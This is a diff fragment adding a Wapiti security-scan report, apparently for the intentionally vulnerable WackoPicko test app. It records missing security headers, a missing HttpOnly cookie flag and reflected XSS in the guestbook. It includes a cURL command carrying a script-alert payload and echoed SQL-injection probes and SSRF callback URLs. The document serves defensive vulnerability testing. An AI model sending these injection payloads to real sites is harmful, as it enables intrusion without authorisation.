+   Comment: &lt;br&gt;
+   &lt;textarea id=&#34;comment-box&#34; name=&#34;comment&#34;&gt;&lt;/textarea&gt; &lt;br&gt;
+   &lt;input type=&#34;submit&#34; value=&#34;Submit&#34; /&gt;
+&lt;/form&gt;
+
+
+&lt;/div&gt;
+       &lt;div class=&#34;column span-24 first last&#34; id=&#34;footer&#34; &gt;
+	&lt;ul&gt;
+	  &lt;li&gt;&lt;a href=&#34;/&#34;&gt;Home&lt;/a&gt; |&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&#34;/admin/index.php?page=login&#34;&gt;Admin&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;mailto:contact@wackopicko.com&#34;&gt;Contact&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;/tos.php&#34;&gt;Terms of Service&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+   
+                                </pre>
+                            </section>
+                        <section id="tab-vuln-12-1-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-12-1-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;OSHP-X-Content-Type-Options&#39;]</pre>
+                        </section>
+
+                <dl><dt>Solutions</dt><dd>Use the recommendations for hardening your HTTP Security Headers.</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-project-secure-headers/#div-bestpractices">OSHP: OWASP Secure Headers Project Best Practices</a></li>
+                    <li><a href="https://www.netsparker.com/blog/web-security/http-security-headers/">Netsparker: HTTP Security Headers: An Easy Way to Harden Your Web Applications</a></li>
+                    <li><a href="https://www.keycdn.com/blog/http-security-headers">KeyCDN: Hardening Your HTTP Security Headers</a></li>
+                    <li><a href="https://owasp.org/www-chapter-ghana/assets/slides/HTTP_Header_Security.pdf">OWASP: HTTP SECURITY HEADERS (Protection For Browsers) (PDF)</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking">OWASP: Clickjacking</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">OWASP: Reflected Cross Site Scripting</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting">OWASP: Stored Cross Site Scripting</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security">OWASP: HTTP Strict Transport Security</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="vuln_type_13">HttpOnly Flag cookie</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it).</dd>
+                </dl>
+
+                        <h4>🟡 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-13-0-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-13-0-2">HTTP Request</a>
+                            <a href="#tab-vuln-13-0-4">cURL command line</a>
+                            <a href="#tab-vuln-13-0-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-13-0-1" style="min-height: 124px;">
+                            <pre>HttpOnly flag is not set in the cookie : PHPSESSID</pre>
+                        </section>
+                        <section id="tab-vuln-13-0-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    GET /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-13-0-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-13-0-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-SESS-02&#39;]</pre>
+                        </section>
+
+                <dl><dt>Solutions</dt><dd>While creation of the cookie, make sure to set the HttpOnly Flag to True.</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html">OWASP: Testing for Cookies Attributes</a></li>
+                    <li><a href="https://owasp.org/www-community/HttpOnly">OWASP: HttpOnly</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="vuln_type_17">Reflected Cross Site Scripting</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications which allow code injection by malicious web users into the web pages viewed by other users. Examples of such code include HTML code and client-side scripts.</dd>
+                </dl>
+
+                        <h4>🟠 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-17-0-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-17-0-2">HTTP Request</a>
+                                <a href="#tab-vuln-17-0-3">HTTP Response</a>
+                            <a href="#tab-vuln-17-0-4">cURL command line</a>
+                            <a href="#tab-vuln-17-0-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-17-0-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter comment</pre>
+                        </section>
+                        <section id="tab-vuln-17-0-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                                    content-length: 72
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    comment=%3CScRiPt%3Ealert%28%27wyv86vk1mx%27%29%3C%2FsCrIpT%3E&amp;name=fuzz
+                                    <br>
+                            </pre>
+                        </section>
+                            <section id="tab-vuln-17-0-3" style="min-height: 124px;" class="is-hidden">
+                                <pre style="white-space: nowrap">
+                                    HTTP 200<br />
+                                            date: Wed, 20 Mar 2024 14:22:50 GMT<br />
+                                            server: Apache/2.4.57 (Debian)<br />
+                                            x-powered-by: PHP/8.2.10<br />
+                                            expires: Thu, 19 Nov 1981 08:52:00 GMT<br />
+                                            cache-control: no-store, no-cache, must-revalidate<br />
+                                            pragma: no-cache<br />
+                                            vary: Accept-Encoding<br />
+                                            content-length: 2117<br />
+                                            keep-alive: timeout=5, max=15<br />
+                                            connection: Keep-Alive<br />
+                                            content-type: text/html; charset=UTF-8<br />
+                                    <br />
+                                    
+
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/screen.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/print.css&#34; type=&#34;text/css&#34; media=&#34;print&#34;&gt;
+    &lt;!--[if IE]&gt;&lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/ie.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;&lt;![endif]--&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/stylings.css&#34; type=&#34;text/css&#34; media=&#34;screen&#34;&gt;
+    &lt;title&gt;WackoPicko.com&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;div class=&#34;container &#34; style=&#34;border: 2px solid #5c95cf;&#34;&gt;
+      &lt;div class=&#34;column span-24 first last&#34;&gt;
+	&lt;h1 id=&#34;title&#34;&gt;&lt;a href=&#34;/&#34;&gt;WackoPicko.com&lt;/a&gt;&lt;/h1&gt;
+      &lt;/div&gt;
+      &lt;div id=&#34;menu&#34;&gt;
+	&lt;div class=&#34;column prepend-1 span-14 first&#34;&gt;
+	  &lt;ul class=&#34;menu&#34;&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/users/home.php&#34;&gt;&lt;span&gt;Home&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/upload.php&#34;&gt;&lt;span&gt;Upload&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/recent.php&#34;&gt;&lt;span&gt;Recent&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li class=&#34;current&#34;&gt;&lt;a href=&#34;/guestbook.php&#34;&gt;&lt;span&gt;Guestbook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+	&lt;div class=&#34;column prepend-1 span-7 first last&#34;&gt;
+	  &lt;ul class=&#34;menu top_login&#34; &gt;
+      	    &lt;li&gt;&lt;a href=&#34;/users/login.php&#34;&gt;&lt;Span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+
+
+
+      &lt;div class=&#34;column span-24 first last&#34; id=&#34;search_bar_blue&#34;&gt;
+	&lt;div class=&#34;column prepend-17 span-7 first last&#34; id=&#34;search_box&#34;&gt;
+	  &lt;form action=&#34;/pictures/search.php&#34; method=&#34;get&#34; style=&#34;display:inline;&#34;&gt;
+	    &lt;input id=&#34;query2&#34; name=&#34;query&#34; size=&#34;15&#34; style=&#34;padding: 2px; font-size: 16px; text-decoration:none;border:none;vertical-align:middle;&#34; type=&#34;text&#34; value=&#34;&#34;/&gt;
+	    &lt;input src=&#34;/images/search_button_white.gif&#34; type=&#34;image&#34; style=&#34;border: 0pt none ; position: relative; top: 0px;vertical-align:middle;margin-left: 1em;&#34; /&gt;
+	  &lt;/form&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+   
+&lt;div class=&#34;column prepend-1 span-24 first last&#34;&gt;
+&lt;h2&gt;Guestbook&lt;/h2&gt;
+&lt;h4&gt;See what people are saying about us!&lt;/h4&gt;
+
+	&lt;p class=&#34;comment&#34;&gt;wyv86vk1mx&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&lt;ScRiPt&gt;alert(&#39;wyv86vk1mx&#39;)&lt;/sCrIpT&gt;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34; AND 72=97 AND &#34;88&#34;=&#34;88&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34; AND 63=63 AND &#34;10&#34;=&#34;10&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!) AND 38=99 AND (50=50&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!) AND 37=98 AND (75=75&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!) AND 56=56 AND (77=77&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39;) AND 95=116 AND (&#39;78&#39;=&#39;78&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39;) AND 63=97 AND (&#39;89&#39;=&#39;89&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39;) AND 81=81 AND (&#39;10&#39;=&#39;10&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34;) AND 49=127 AND (&#34;38&#34;=&#34;38&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34;) AND 12=63 AND (&#34;42&#34;=&#34;42&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34;) AND 52=52 AND (&#34;27&#34;=&#34;27&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh/ssrf/t9izvr/1/636f6d6d656e74/&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh/ssrf/t9izvr/1/6e616d65/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh/ssrf/t9izvr/2/6e616d65/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh/ssrf/t9izvr/2/636f6d6d656e74/&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz AND 32=32 AND 58=58 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039; AND 43=103 AND &amp;#039;47&amp;#039;=&amp;#039;47 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039; AND 99=194 AND &amp;#039;27&amp;#039;=&amp;#039;27 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039; AND 68=68 AND &amp;#039;44&amp;#039;=&amp;#039;44 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot; AND 26=72 AND &amp;quot;82&amp;quot;=&amp;quot;82 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot; AND 67=114 AND &amp;quot;71&amp;quot;=&amp;quot;71 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot; AND 38=38 AND &amp;quot;78&amp;quot;=&amp;quot;78 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz) AND 66=115 AND (63=63 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz) AND 15=86 AND (54=54 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz) AND 19=19 AND (77=77 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039;) AND 24=36 AND (&amp;#039;10&amp;#039;=&amp;#039;10 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039;) AND 20=60 AND (&amp;#039;32&amp;#039;=&amp;#039;32 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039;) AND 54=54 AND (&amp;#039;56&amp;#039;=&amp;#039;56 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot;) AND 57=133 AND (&amp;quot;11&amp;quot;=&amp;quot;11 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot;) AND 74=145 AND (&amp;quot;89&amp;quot;=&amp;quot;89 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot;) AND 57=57 AND (&amp;quot;67&amp;quot;=&amp;quot;67 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default¿&amp;#039;&amp;quot;( &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;default¿&#39;&#34;(&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default AND 28=116 AND 77=77 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default AND 14=94 AND 88=88 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default AND 39=39 AND 43=43 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039; AND 58=82 AND &amp;#039;84&amp;#039;=&amp;#039;84 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039; AND 97=186 AND &amp;#039;22&amp;#039;=&amp;#039;22 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039; AND 10=10 AND &amp;#039;28&amp;#039;=&amp;#039;28 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot; AND 81=146 AND &amp;quot;11&amp;quot;=&amp;quot;11 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot; AND 87=117 AND &amp;quot;32&amp;quot;=&amp;quot;32 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot; AND 35=35 AND &amp;quot;25&amp;quot;=&amp;quot;25 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default) AND 37=99 AND (39=39 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default) AND 39=122 AND (50=50 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default) AND 98=98 AND (35=35 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039;) AND 27=114 AND (&amp;#039;94&amp;#039;=&amp;#039;94 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039;) AND 60=85 AND (&amp;#039;54&amp;#039;=&amp;#039;54 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039;) AND 18=18 AND (&amp;#039;47&amp;#039;=&amp;#039;47 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot;) AND 44=121 AND (&amp;quot;79&amp;quot;=&amp;quot;79 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot;) AND 44=136 AND (&amp;quot;16&amp;quot;=&amp;quot;16 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot;) AND 58=58 AND (&amp;quot;26&amp;quot;=&amp;quot;26 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there! AND 90=174 AND 37=37&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there! AND 86=101 AND 42=42&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there! AND 57=57 AND 95=95&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39; AND 13=95 AND &#39;95&#39;=&#39;95&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39; AND 85=157 AND &#39;46&#39;=&#39;46&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39; AND 17=17 AND &#39;32&#39;=&#39;32&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34; AND 44=63 AND &#34;58&#34;=&#34;58&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz¿&#39;&#34;(&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz¿&amp;#039;&amp;quot;( &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz AND 58=114 AND 90=90&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz AND 28=67 AND 51=51&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz AND 58=58 AND 41=41&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39; AND 50=122 AND &#39;59&#39;=&#39;59&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39; AND 63=134 AND &#39;92&#39;=&#39;92&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39; AND 17=17 AND &#39;91&#39;=&#39;91&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34; AND 96=189 AND &#34;60&#34;=&#34;60&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34; AND 89=173 AND &#34;35&#34;=&#34;35&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34; AND 66=66 AND &#34;90&#34;=&#34;90&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz) AND 84=157 AND (25=25&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz) AND 53=152 AND (85=85&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz) AND 32=32 AND (97=97&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39;) AND 50=84 AND (&#39;10&#39;=&#39;10&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39;) AND 91=148 AND (&#39;63&#39;=&#39;63&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39;) AND 60=60 AND (&#39;62&#39;=&#39;62&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34;) AND 10=88 AND (&#34;47&#34;=&#34;47&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34;) AND 58=78 AND (&#34;74&#34;=&#34;74&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34;) AND 55=55 AND (&#34;45&#34;=&#34;45&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz AND 77=160 AND 45=45 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz AND 79=104 AND 47=47 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi, I love your site!&lt;/p&gt;
+	&lt;p&gt; - by adam &lt;/p&gt;
+	
+
+
+
+&lt;form action=&#34;/guestbook.php&#34; method=&#34;POST&#34;&gt;
+   Name: &lt;br&gt;
+   &lt;input type=&#34;text&#34; name=&#34;name&#34; /&gt;&lt;br&gt;
+   Comment: &lt;br&gt;
+   &lt;textarea id=&#34;comment-box&#34; name=&#34;comment&#34;&gt;&lt;/textarea&gt; &lt;br&gt;
+   &lt;input type=&#34;submit&#34; value=&#34;Submit&#34; /&gt;
+&lt;/form&gt;
+
+
+&lt;/div&gt;
+       &lt;div class=&#34;column span-24 first last&#34; id=&#34;footer&#34; &gt;
+	&lt;ul&gt;
+	  &lt;li&gt;&lt;a href=&#34;/&#34;&gt;Home&lt;/a&gt; |&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&#34;/admin/index.php?page=login&#34;&gt;Admin&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;mailto:contact@wackopicko.com&#34;&gt;Contact&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;/tos.php&#34;&gt;Terms of Service&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+   
+                                </pre>
+                            </section>
+                        <section id="tab-vuln-17-0-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34; -d &#34;comment=%3CScRiPt%3Ealert%28%27wyv86vk1mx%27%29%3C%2FsCrIpT%3E&amp;name=fuzz&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-17-0-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-17-1-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-17-1-2">HTTP Request</a>
+                                <a href="#tab-vuln-17-1-3">HTTP Response</a>
+                            <a href="#tab-vuln-17-1-4">cURL command line</a>
+                            <a href="#tab-vuln-17-1-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-17-1-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter comment</pre>
+                        </section>
+                        <section id="tab-vuln-17-1-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
